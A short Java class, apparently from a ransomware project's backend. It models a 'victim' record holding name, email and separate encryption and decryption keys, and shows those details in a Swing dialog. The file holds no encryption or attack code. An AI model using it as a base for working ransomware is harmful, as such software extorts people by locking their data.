package com.jdrll.test1.ransomewareBackend;

import javax.crypto.SecretKey;
import javax.swing.*;

public class VictimDeri extends Victim {
    public VictimDeri(String nombre, String apellido, String email, SecretKey keyCifrado, SecretKey keyDescifrado) {
        super(nombre, apellido, email, keyCifrado, keyDescifrado);
    }

    @Override
    public void displayInfo() {
        JOptionPane.showMessageDialog(null,
                "ID: " + getId() +
                        "\nNombre: " + getNombre() +
                        "\nApellido: " + getApellido() +
                        "\nEmail: " + getEmail(),
                "Información del Usuario",
                JOptionPane.INFORMATION_MESSAGE);
    }

}
